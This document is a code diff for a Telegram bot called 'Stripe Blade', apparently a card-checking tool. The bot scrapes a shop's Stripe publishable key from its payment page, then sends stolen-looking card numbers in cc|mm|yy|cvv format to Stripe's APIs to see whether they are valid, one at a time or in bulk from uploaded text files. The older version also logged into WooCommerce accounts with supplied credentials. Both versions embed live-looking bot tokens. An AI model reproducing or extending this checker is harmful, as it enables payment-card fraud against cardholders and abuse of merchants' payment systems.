@@ -1,193 +1,176 @@
-import requests
-import re
-import threading
 import logging
+import requests
 import json
+import re
 from bs4 import BeautifulSoup
-from io import BytesIO
-from telegram import Update
-from telegram.ext import (
-    ApplicationBuilder, CommandHandler, MessageHandler,
-    ContextTypes, filters
-)
+from telegram import Update, Document
+from telegram.ext import ApplicationBuilder, MessageHandler, CommandHandler, ContextTypes, filters
 
-# Setup logging
-logging.basicConfig(
-    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
-    level=logging.INFO
-)
+# --- CONFIG ---
+BOT_TOKEN = "8153748905:AAGp03pGvNcuL7CAhcOV92jGv2c9opX-BVU"
+logging.basicConfig(level=logging.INFO)
 
-BOT_TOKEN = "7248159727:AAEzc2CNStU6H8F3zD4Y5CFIYRSkyhO_TiQ"
+# --- STORAGE ---
 user_data = {}
-lock = threading.Lock()
 
+# --- HELPERS ---
+def extract_stripe_info(html):
+    soup = BeautifulSoup(html, "html.parser")
+    pk = None
+    stripe_type = None
 
-def get_headers():
-    return {
-        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
-        "accept": "text/html,application/xhtml+xml",
-        "accept-language": "en-US,en;q=0.9",
+    scripts = soup.find_all("script")
+    for script in scripts:
+        if script.string and 'pk_live_' in script.string:
+            match = re.search(r'pk_live_[0-9a-zA-Z]+', script.string)
+            if match:
+                pk = match.group()
+
+    if "setup_intents" in html:
+        stripe_type = "setup_intent"
+    elif "payment_methods" in html:
+        stripe_type = "payment_method"
+    elif "tokens" in html:
+        stripe_type = "token"
+    elif "sources" in html:
+        stripe_type = "source"
+
+    return pk, stripe_type
+
+async def fetch_add_payment_page(url, session):
+    headers = {
+        "User-Agent": "Mozilla/5.0",
+        "Accept": "text/html,application/xhtml+xml",
     }
+    response = session.get(url, headers=headers)
+    return response.text if response.ok else None
 
-
-def extract_pk(html):
-    match = re.search(r'pk_live_[a-zA-Z0-9]{10,}', html)
-    return match.group(0) if match else None
-
-
-def detect_stripe_type(html):
-    if "setup_intent" in html:
-        return "setup_intent"
-    elif "payment_method" in html:
-        return "payment_method"
-    elif "source" in html:
-        return "source"
-    elif "token" in html:
-        return "token"
-    return "unknown"
-
-
-def try_login(site, email, password, session):
-    login_url = f"https://{site}/my-account/"
-    r = session.get(login_url, headers=get_headers())
-    soup = BeautifulSoup(r.text, 'html.parser')
-    nonce = soup.find("input", {"name": "woocommerce-login-nonce"})
-    referer = soup.find("input", {"name": "_wp_http_referer"})
-    if not nonce:
-        return False, "Login page error"
-    payload = {
-        'username': email,
-        'password': password,
-        'woocommerce-login-nonce': nonce["value"],
-        '_wp_http_referer': referer["value"] if referer else "/my-account/",
-        'login': 'Log in'
+def create_payment_method(card):
+    url = "https://api.stripe.com/v1/payment_methods"
+    headers = {"Content-Type": "application/x-www-form-urlencoded"}
+    data = {
+        "type": "card",
+        "card[number]": card[0],
+        "card[exp_month]": card[1],
+        "card[exp_year]": card[2],
+        "card[cvc]": card[3],
     }
-    r = session.post(login_url, data=payload, headers=get_headers())
-    return ("customer-logout" in r.text), r.text
+    return requests.post(url, headers=headers, data=data)
 
+def submit_to_stripe(card, stripe_type, pk):
+    pm_res = create_payment_method(card)
+    if pm_res.status_code != 200:
+        return pm_res.text
+
+    pm_id = pm_res.json().get("id")
+
+    if stripe_type == "setup_intent":
+        endpoint = "https://api.stripe.com/v1/setup_intents"
+        data = {"payment_method": pm_id, "confirm": "true", "client_secret": f"{pk}_secret_123"}
+    elif stripe_type == "payment_method":
+        endpoint = "https://api.stripe.com/v1/payment_methods"
+        data = {"payment_method": pm_id}
+    elif stripe_type == "token":
+        endpoint = "https://api.stripe.com/v1/tokens"
+        data = {
+            "card[number]": card[0],
+            "card[exp_month]": card[1],
+            "card[exp_year]": card[2],
+            "card[cvc]": card[3],
+        }
+    elif stripe_type == "source":
+        endpoint = "https://api.stripe.com/v1/sources"
+        data = {
+            "type": "card",
+            "card[number]": card[0],
+            "card[exp_month]": card[1],
+            "card[exp_year]": card[2],
+            "card[cvc]": card[3],
+        }
+    else:
+        return json.dumps({"error": "Unsupported Stripe API type"})
+
+    headers = {"Authorization": f"Bearer {pk}"}
+    res = requests.post(endpoint, headers=headers, data=data)
+    return res.text
+
+def parse_card(combo):
+    parts = combo.strip().split("|")
+    return parts if len(parts) == 4 else None
+
+# --- COMMANDS ---
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text("Welcome to Stripe Blade.\nUse /addsitelogin to begin.")
 
 async def addsitelogin(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    args = context.args
-    if not args or len(args) < 1 or '|' not in args[0]:
-        await update.message.reply_text("Usage: /addsitelogin site.com|email|password")
-        return
-    site, email, password = args[0].split("|")
-    session = requests.Session()
-    success, _ = try_login(site, email, password, session)
-    if not success:
-        await update.message.reply_text("Login failed.")
-        return
-    with lock:
-        user_data[user_id] = {
-            "site": site,
-            "email": email,
-            "password": password,
-            "session": session
-        }
-    await update.message.reply_text("Login successful! Now send the Add Payment Method URL.")
-
+    await update.message.reply_text("Send the full Add Payment Method URL of the site.")
 
 async def handle_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    url = update.message.text.strip()
+    user_id = update.effective_user.id
+
+    session = requests.Session()
+    html = await context.application.run_in_thread(fetch_add_payment_page, url, session)
+    if not html:
+        await update.message.reply_text("Failed to load page.")
+        return
+
+    pk, api_type = extract_stripe_info(html)
+    if not pk or not api_type:
+        await update.message.reply_text("Failed to extract Stripe info.")
+        return
+
+    user_data[user_id] = {"url": url, "pk": pk, "api": api_type}
+    await update.message.reply_text(f"Saved.\nDetected:\nPK: {pk}\nAPI: {api_type}")
+
+async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if user_id not in user_data:
-        await update.message.reply_text("Please login first using /addsitelogin")
+        await update.message.reply_text("Use /addsitelogin first.")
         return
-    url = update.message.text
-    session = user_data[user_id]["session"]
-    try:
-        r = session.get(url, headers=get_headers())
-        html = r.text
-        pk = extract_pk(html)
-        api_type = detect_stripe_type(html)
-        user_data[user_id]["check_url"] = url
-        user_data[user_id]["pk"] = pk
-        user_data[user_id]["api_type"] = api_type
-        await update.message.reply_text(f"Detected API: `{api_type}`\nExtracted PK: `{pk}`", parse_mode="Markdown")
-    except Exception as e:
-        logging.error(f"Error fetching URL: {e}")
-        await update.message.reply_text("Failed to fetch and parse the Add Payment Method page.")
 
-
-def parse_card(card):
-    match = re.match(r'(\d{13,16})[|:](\d{2})[|:/](\d{2,4})[|:](\d{3,4})', card)
-    return match.groups() if match else None
-
-
-def submit_to_stripe(api_type, pk, cc, mm, yy, cvv):
-    if len(yy) == 2:
-        yy = "20" + yy
-    headers = {"Authorization": f"Bearer {pk}"}
-    data = {
-        "card[number]": cc,
-        "card[exp_month]": mm,
-        "card[exp_year]": yy,
-        "card[cvc]": cvv
-    }
-
-    if api_type == "payment_method":
-        data["type"] = "card"
-        url = "https://api.stripe.com/v1/payment_methods"
-    elif api_type == "token":
-        url = "https://api.stripe.com/v1/tokens"
-    elif api_type == "source":
-        data["type"] = "card"
-        url = "https://api.stripe.com/v1/sources"
-    elif api_type == "setup_intent":
-        data["type"] = "card"
-        url = "https://api.stripe.com/v1/payment_methods"
-    else:
-        return {"error": "Unsupported API type"}
-
-    r = requests.post(url, headers=headers, data=data)
-    return r.json()
-
-
-async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if user_id not in user_data or "pk" not in user_data[user_id]:
-        await update.message.reply_text("Please login and send Add Payment URL first.")
-        return
-    args = context.args
-    if not args:
+    if len(context.args) != 1:
         await update.message.reply_text("Usage: /chk cc|mm|yy|cvv")
         return
-    combo = args[0]
-    parsed = parse_card(combo)
-    if not parsed:
-        await update.message.reply_text("Invalid format. Use: cc|mm|yy|cvv")
-        return
-    cc, mm, yy, cvv = parsed
-    pk = user_data[user_id]["pk"]
-    api_type = user_data[user_id]["api_type"]
-    resp = submit_to_stripe(api_type, pk, cc, mm, yy, cvv)
-    await update.message.reply_text(f"`{json.dumps(resp, indent=2)}`", parse_mode="Markdown")
 
+    combo = context.args[0]
+    card = parse_card(combo)
+    if not card:
+        await update.message.reply_text("Invalid format.")
+        return
+
+    info = user_data[user_id]
+    res = await context.application.run_in_thread(submit_to_stripe, card, info["api"], info["pk"])
+    await update.message.reply_text(f"`{res}`", parse_mode="Markdown")
 
 async def handle_txt(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if user_id not in user_data or "pk" not in user_data[user_id]:
-        await update.message.reply_text("Please login and send Add Payment URL first.")
+    doc = update.message.document
+    if doc.mime_type != "text/plain":
+        await update.message.reply_text("Upload a .txt file only.")
         return
-    file = await update.message.document.get_file()
-    content = await file.download_as_bytes()
-    combos = content.decode().splitlines()
-    pk = user_data[user_id]["pk"]
-    api_type = user_data[user_id]["api_type"]
-    for combo in combos:
-        parsed = parse_card(combo)
-        if not parsed:
-            await update.message.reply_text(f"{combo} -> Invalid format")
-            continue
-        cc, mm, yy, cvv = parsed
-        resp = submit_to_stripe(api_type, pk, cc, mm, yy, cvv)
-        await update.message.reply_text(f"`{json.dumps(resp, indent=2)}`", parse_mode="Markdown")
 
+    user_id = update.effective_user.id
+    if user_id not in user_data:
+        await update.message.reply_text("Use /addsitelogin first.")
+        return
 
-if __name__ == "__main__":
-    app = ApplicationBuilder().token(BOT_TOKEN).build()
-    app.add_handler(CommandHandler("addsitelogin", addsitelogin))
-    app.add_handler(CommandHandler("chk", chk_command))
-    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_url))
-    app.add_handler(MessageHandler(filters.Document.ALL, handle_txt))
-    app.run_polling()
+    file = await doc.get_file()
+    content = await file.download_as_bytearray()
+    lines = content.decode().splitlines()
+
+    info = user_data[user_id]
+    for line in lines:
+        card = parse_card(line)
+        if card:
+            res = await context.application.run_in_thread(submit_to_stripe, card, info["api"], info["pk"])
+            await update.message.reply_text(f"`{res}`", parse_mode="Markdown")
+
+# --- MAIN ---
+app = ApplicationBuilder().token(BOT_TOKEN).build()
+app.add_handler(CommandHandler("start", start))
+app.add_handler(CommandHandler("addsitelogin", addsitelogin))
+app.add_handler(CommandHandler("chk", chk))
+app.add_handler(MessageHandler(filters.TEXT & filters.Regex(r"^https?://"), handle_url))
+app.add_handler(MessageHandler(filters.Document.MimeType("text/plain"), handle_txt))
+
+app.run_polling()
